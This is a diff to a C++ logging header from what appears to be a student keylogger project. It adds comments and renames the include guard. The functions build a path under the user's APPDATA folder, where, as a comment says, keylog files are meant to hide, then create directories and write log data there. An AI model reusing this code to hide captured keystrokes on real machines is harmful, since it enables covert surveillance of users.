@@ -3,8 +3,8 @@ Jacob Brown jmb7438@rit.edu
 Geoffrey Kanteles gdk7676@rit.edu
 */
 
-#ifndef IO_H
-#define IO_H
+#ifndef LOGGING_H
+#define LOGGING_H
 
 #include <string>
 #include <cstdlib>
@@ -14,6 +14,11 @@ Geoffrey Kanteles gdk7676@rit.edu
 
 namespace Logging
 {
+    /**
+        Get current appdata path and return it as a string. The keylog files will be hiding here
+        @param append_separator used to separate the path
+        @return string of appdata path to current user
+    */
     std::string GetOurPath(const bool append_separator = false)
     {
         std::string appdata_dir(getenv("APPDATA"));
@@ -22,11 +27,21 @@ namespace Logging
         return full + (append_separator ? "\\" : "");
     }
 
+    /**
+        Make a directory with the given path
+        @param path to use to make the directory
+        @return True if file is created, False otherwise
+    */
     bool MkOneDr(std::string path)
     {
         return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
     }
 
+    /**
+        Make a directory with the given path
+        @param path to use to make the directory
+        @return True if file is created, False otherwise
+    */
     bool MKDir(std::string path)
     {
         for(char &c : path)
@@ -43,6 +58,11 @@ namespace Logging
     }
 
     template <class T>
+    /**
+        Writes data to a log
+        @param t what to write to log
+        @return string of data written
+    */
     std::string WriteLog(const T &t)
     {
         std::string path = GetOurPath(true);
@@ -70,5 +90,5 @@ namespace Logging
     }
 }
 
-#endif // IO_H
+#endif // LOGGING_H
 
